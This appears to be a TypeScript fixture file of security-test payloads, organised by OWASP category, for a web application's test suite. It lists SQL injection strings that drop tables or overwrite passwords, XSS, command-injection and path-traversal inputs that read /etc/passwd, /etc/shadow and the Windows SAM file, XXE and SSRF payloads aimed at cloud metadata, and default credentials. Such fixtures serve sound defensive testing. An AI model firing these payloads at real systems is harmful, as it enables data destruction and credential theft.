/**
 * Security Test Payloads
 *
 * Comprehensive collection of attack payloads for testing security vulnerabilities.
 * Based on OWASP Testing Guide and common attack patterns.
 */

/**
 * SQL Injection Payloads (OWASP A03:2021)
 * Tests for SQL injection vulnerabilities in database queries
 */
export const SQL_INJECTION_PAYLOADS = [
  // Classic SQL injection
  "' OR '1'='1",
  "' OR '1'='1' --",
  "' OR '1'='1' /*",
  "admin' --",
  "admin' #",

  // Union-based injection
  "' UNION SELECT NULL--",
  "' UNION SELECT NULL,NULL--",
  "' UNION SELECT NULL,NULL,NULL--",
  "1' UNION SELECT username, password FROM users--",

  // Time-based blind injection
  "'; WAITFOR DELAY '00:00:05'--",
  "'; SELECT SLEEP(5)--",
  "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",

  // Boolean-based blind injection
  "1' AND '1'='1",
  "1' AND '1'='2",

  // Stacked queries
  "'; DROP TABLE users--",
  "'; DELETE FROM users WHERE '1'='1",
  "'; UPDATE users SET password='hacked' WHERE '1'='1",

  // Comment injection
  "/**/",
  "/* comment */",
  "-- comment",
  "# comment",

  // Encoded payloads
  "%27%20OR%20%271%27%3D%271",
  "&#39; OR &#39;1&#39;=&#39;1",
] as const;

/**
 * XSS (Cross-Site Scripting) Payloads (OWASP A03:2021)
 * Tests for XSS vulnerabilities in user inputs
 */
export const XSS_PAYLOADS = [
  // Basic script tags
  "<script>alert('XSS')</script>",
  "<script>alert(document.cookie)</script>",
  "<script>alert(1)</script>",

  // Event handlers
  "<img src=x onerror=alert('XSS')>",
  "<img src=x onerror=alert(document.cookie)>",
  "<body onload=alert('XSS')>",
  "<input onfocus=alert('XSS') autofocus>",
  "<select onfocus=alert('XSS') autofocus>",
  "<textarea onfocus=alert('XSS') autofocus>",
  "<marquee onstart=alert('XSS')>",

  // SVG-based XSS
  "<svg/onload=alert('XSS')>",
  "<svg><script>alert('XSS')</script></svg>",
  "<svg><animatetransform onbegin=alert('XSS')>",

  // JavaScript protocol
  "javascript:alert('XSS')",
  "javascript:alert(document.cookie)",

  // Data URI
  "data:text/html,<script>alert('XSS')</script>",
  "data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=",

  // Iframe injection
  "<iframe src='javascript:alert(\"XSS\")'></iframe>",
  "<iframe src='data:text/html,<script>alert(\"XSS\")</script>'></iframe>",

  // Filter bypass techniques
  "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
  "<ScRiPt>alert('XSS')</sCrIpT>",
  "<<SCRIPT>alert('XSS');//<</SCRIPT>",

  // HTML5 attributes
  "<input autofocus onfocus=alert('XSS')>",
  "<video><source onerror=alert('XSS')>",
  "<audio src=x onerror=alert('XSS')>",

  // Encoded payloads
  "%3Cscript%3Ealert('XSS')%3C/script%3E",
  "&#60;script&#62;alert('XSS')&#60;/script&#62;",

  // DOM-based XSS
  "<img src='x' onerror='eval(atob(\"YWxlcnQoJ1hTUycpOw==\"))'>",
] as const;

/**
 * Path Traversal Payloads (OWASP A01:2021)
 * Tests for directory traversal vulnerabilities
 */
export const PATH_TRAVERSAL_PAYLOADS = [
  // Unix-style
  "../../../etc/passwd",
  "../../../../etc/passwd",
  "../../../../../etc/shadow",
  "../../../../../../etc/hosts",

  // Windows-style
  "..\\..\\..\\windows\\system32\\config\\sam",
  "..\\..\\..\\..\\windows\\win.ini",
  "..\\..\\..\\..\\boot.ini",

  // Encoded variants
  "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
  "%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5csystem32%5cconfig%5csam",
  "..%252f..%252f..%252fetc%252fpasswd",

  // Double encoding
  "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",

  // Unicode encoding
  "..%c1%1c..%c1%1c..%c1%1cetc%c1%1cpasswd",

  // Null byte injection
  "../../../etc/passwd%00",
  "../../../etc/passwd\x00.jpg",
] as const;

/**
 * Command Injection Payloads (OWASP A03:2021)
 * Tests for OS command injection vulnerabilities
 */
export const COMMAND_INJECTION_PAYLOADS = [
  // Unix command chaining
  "; ls -la",
  "| ls -la",
  "& ls -la",
  "&& ls -la",
  "|| ls -la",
  "`ls -la`",
  "$(ls -la)",

  // Data exfiltration
  "; cat /etc/passwd",
  "| cat /etc/passwd",
  "&& cat /etc/passwd",

  // Time-based detection
  "; sleep 5",
  "| sleep 5",
  "&& sleep 5",

  // Windows commands
  "& dir",
  "&& dir",
  "| dir",

  // Newline injection
  "\nls -la",
  "\r\nls -la",

  // Encoded payloads
  ";%20ls%20-la",
  "|%20cat%20/etc/passwd",
] as const;

/**
 * LDAP Injection Payloads (OWASP A03:2021)
 * Tests for LDAP injection vulnerabilities
 */
export const LDAP_INJECTION_PAYLOADS = [
  "*",
  "*)(uid=*",
  "admin)(|(password=*",
  "*)(objectClass=*",
  ")(cn=*))(|(cn=*",
] as const;

/**
 * XML External Entity (XXE) Payloads (OWASP A05:2021)
 * Tests for XXE vulnerabilities in XML parsers
 */
export const XXE_PAYLOADS = [
  // Basic XXE
  `<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>`,

  // XXE with parameter entity
  `<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "file:///etc/passwd" >
  %xxe;
]>`,

  // XXE via SSRF
  `<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal-server/secret" >]>
<foo>&xxe;</foo>`,
] as const;

/**
 * Prototype Pollution Payloads (OWASP A08:2021)
 * Tests for JavaScript prototype pollution vulnerabilities
 */
export const PROTOTYPE_POLLUTION_PAYLOADS = [
  { "__proto__": { "admin": true } },
  { "constructor": { "prototype": { "admin": true } } },
  { "__proto__.admin": true },
  { "constructor.prototype.admin": true },
] as const;

/**
 * NoSQL Injection Payloads (OWASP A03:2021)
 * Tests for NoSQL injection vulnerabilities
 */
export const NOSQL_INJECTION_PAYLOADS = [
  // MongoDB
  { "$ne": null },
  { "$ne": "" },
  { "$gt": "" },
  { "$regex": ".*" },
  { "$where": "1==1" },

  // String-based
  "' || '1'=='1",
  "' || 1==1//",
  "' || 1==1%00",
] as const;

/**
 * JWT Attack Payloads
 * Tests for JWT vulnerabilities
 */
export const JWT_ATTACK_PAYLOADS = {
  // None algorithm attack
  noneAlgorithm: "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyLCJhZG1pbiI6dHJ1ZX0.",

  // Algorithm confusion (RS256 -> HS256)
  algorithmConfusion: true,

  // Weak secrets to test
  weakSecrets: ["secret", "123456", "password", "admin", "test"],

  // Expired token
  expired: true,

  // Invalid signature
  invalidSignature: true,
} as const;

/**
 * CSRF Token Patterns
 * Common CSRF token vulnerabilities to test
 */
export const CSRF_TEST_PATTERNS = {
  // Missing token
  missingToken: true,

  // Empty token
  emptyToken: "",

  // Invalid token
  invalidToken: "invalid-csrf-token-12345",

  // Token reuse
  tokenReuse: true,

  // Cross-origin requests
  crossOrigin: true,
} as const;

/**
 * Server-Side Request Forgery (SSRF) Payloads (OWASP A10:2021)
 * Tests for SSRF vulnerabilities
 */
export const SSRF_PAYLOADS = [
  // Localhost variants
  "http://localhost",
  "http://127.0.0.1",
  "http://[::1]",
  "http://0.0.0.0",

  // Internal IPs
  "http://192.168.1.1",
  "http://10.0.0.1",
  "http://172.16.0.1",

  // Cloud metadata endpoints
  "http://169.254.169.254/latest/meta-data/",
  "http://metadata.google.internal/computeMetadata/v1/",

  // DNS rebinding
  "http://localtest.me",
  "http://127.0.0.1.nip.io",

  // Bypass filters
  "http://[::ffff:127.0.0.1]",
  "http://127.0.0.1.xip.io",
  "http://0x7f000001",
  "http://2130706433",
] as const;

/**
 * Header Injection Payloads
 * Tests for HTTP header injection vulnerabilities
 */
export const HEADER_INJECTION_PAYLOADS = [
  "\r\nX-Injected-Header: injected",
  "\nX-Injected-Header: injected",
  "%0d%0aX-Injected-Header: injected",
  "%0aX-Injected-Header: injected",
  "\r\n\r\n<script>alert('XSS')</script>",
] as const;

/**
 * Authentication Bypass Payloads
 * Common authentication bypass attempts
 */
export const AUTH_BYPASS_PAYLOADS = {
  // Username enumeration
  usernames: ["admin", "administrator", "root", "test", "user", "guest"],

  // Default credentials
  defaultCredentials: [
    { username: "admin", password: "admin" },
    { username: "admin", password: "password" },
    { username: "administrator", password: "administrator" },
    { username: "root", password: "root" },
    { username: "test", password: "test" },
  ],

  // SQL injection in login
  sqlInjection: [
    { username: "admin' --", password: "anything" },
    { username: "admin' OR '1'='1", password: "anything" },
    { username: "admin'/*", password: "anything" },
  ],
} as const;

/**
 * Rate Limiting Test Patterns
 * Tests for rate limiting and brute force protection
 */
export const RATE_LIMIT_TEST = {
  // Number of requests to test
  requestCount: 100,

  // Expected rate limit threshold
  expectedThreshold: 5,

  // Time window (seconds)
  timeWindow: 60,

  // Expected status code
  expectedStatusCode: 429,
} as const;

/**
 * Security Headers to Validate
 * Expected security headers and their values
 */
export const EXPECTED_SECURITY_HEADERS = {
  "strict-transport-security": "max-age=63072000; includeSubDomains; preload",
  "x-frame-options": "DENY",
  "x-content-type-options": "nosniff",
  "x-xss-protection": "1; mode=block",
  "referrer-policy": "strict-origin-when-cross-origin",
  "permissions-policy": "geolocation=(), microphone=(), camera=()",
  "content-security-policy": true, // Just check if present
} as const;

/**
 * Sensitive Data Patterns
 * Patterns to detect in logs/responses
 */
export const SENSITIVE_DATA_PATTERNS = [
  // Tokens
  /Bearer\s+[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+/,
  /jwt["\s:=]+[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+/i,

  // API Keys
  /api[_-]?key["\s:=]+[A-Za-z0-9]{32,}/i,
  /secret[_-]?key["\s:=]+[A-Za-z0-9]{32,}/i,

  // Passwords
  /password["\s:=]+.{8,}/i,
  /passwd["\s:=]+.{8,}/i,

  // Credit cards
  /\b\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4}\b/,

  // Social Security Numbers
  /\b\d{3}-\d{2}-\d{4}\b/,

  // Email addresses (in certain contexts)
  /\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b/,
] as const;

/**
 * File Upload Vulnerabilities
 * Malicious file upload payloads
 */
export const FILE_UPLOAD_PAYLOADS = {
  // Executable extensions
  dangerousExtensions: [
    ".exe", ".dll", ".bat", ".cmd", ".sh", ".ps1",
    ".php", ".jsp", ".asp", ".aspx",
  ],

  // Double extension bypass
  doubleExtension: "image.jpg.php",

  // Null byte injection
  nullByte: "image.php%00.jpg",

  // MIME type mismatch
  mimeMismatch: {
    filename: "malicious.exe",
    contentType: "image/jpeg",
  },

  // SVG with embedded script
  maliciousSVG: `<svg xmlns="http://www.w3.org/2000/svg">
    <script>alert('XSS')</script>
  </svg>`,
} as const;

/**
 * Export all payloads for easy testing
 */
export const ALL_PAYLOADS = {
  sqlInjection: SQL_INJECTION_PAYLOADS,
  xss: XSS_PAYLOADS,
  pathTraversal: PATH_TRAVERSAL_PAYLOADS,
  commandInjection: COMMAND_INJECTION_PAYLOADS,
  ldapInjection: LDAP_INJECTION_PAYLOADS,
  xxe: XXE_PAYLOADS,
  prototypePollution: PROTOTYPE_POLLUTION_PAYLOADS,
  nosqlInjection: NOSQL_INJECTION_PAYLOADS,
  jwt: JWT_ATTACK_PAYLOADS,
  csrf: CSRF_TEST_PATTERNS,
  ssrf: SSRF_PAYLOADS,
  headerInjection: HEADER_INJECTION_PAYLOADS,
  authBypass: AUTH_BYPASS_PAYLOADS,
  rateLimit: RATE_LIMIT_TEST,
  securityHeaders: EXPECTED_SECURITY_HEADERS,
  sensitiveData: SENSITIVE_DATA_PATTERNS,
  fileUpload: FILE_UPLOAD_PAYLOADS,
} as const;
